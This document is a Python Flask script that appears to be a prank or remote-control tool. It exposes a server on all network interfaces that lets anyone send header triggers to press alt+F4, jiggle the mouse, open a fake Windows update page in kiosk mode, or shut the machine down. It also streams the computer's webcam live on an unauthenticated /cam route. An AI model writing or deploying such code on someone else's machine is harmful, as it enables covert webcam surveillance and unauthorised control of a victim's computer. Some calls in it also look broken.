import os
import sys
import keyboard
import time
from flask import Flask, request, abort, render_template, Response
import cv2
import ait
import pygame
app = Flask(__name__)
camera=cv2.VideoCapture(0)
responsegood = '<img src="https://c.tenor.com/4Mv5tE-bc-4AAAAC/parks-and-rec-parks-and-recreation.gif" alt"haha"><p>ur do the <strong>good</strong></p>', 200


@app.route('/', methods=['GET','POST'])

def webhook():
    if request.method == 'GET':
        print("GET Request Received")
        print(request.headers)
        if "shake" in request.headers:
            shake()
            return responsegood
        elif "altf4" in request.headers:
            altf4()
            return responsegood
        elif "update" in request.headers:
            update()
            return responsegood
        elif "shutdown" in request.headers:
            shutdown()
            return responsegood
        else:
            return 'done messed up boi', 400
    else:
        print('EXITING...')
        time.sleep(2)
        os._exit(0)
#press altf4
def altf4():
    keyboard.send("alt+F4")
#shake the mouse
def shake():
    ait.move(60j, -9j)
    time.sleep(0.1)
    ait.move(-30j, 10j)
    time.sleep(0.1)
    ait.move(10j, 50j)
    time.sleep(0.1)
    ait.move(-40j, -51j)
#fake windows update
def update():
    pygame.init()
    pygame.mixer.music.set_volume(1.0)
    pygame.mixer.music.load("error.mp4")
    pygame.mixer.music.play(1)
    keyboard.send('Win+R')
    time.sleep(0.1)
    keyboard.write("firefox --kiosk https://fakeupdate.net/win10ue/", delay=0.000)
    keyboard.send('Enter')
def shutdown():
    os.system("shutdown /s /t 1")

def generate_frames():
    while True:
        success,frame=camera.read()
        if not success:
            break
        else:
            ret, buffer=cv2.imencode('.jpg',frame)
            frame = buffer.tobytes()
        yield(b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
@app.route('/cam')
def cam():
    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')


if __name__ == '__main__':
    app.run(host="0.0.0.0",port=5000)
#you can change the port it runs on^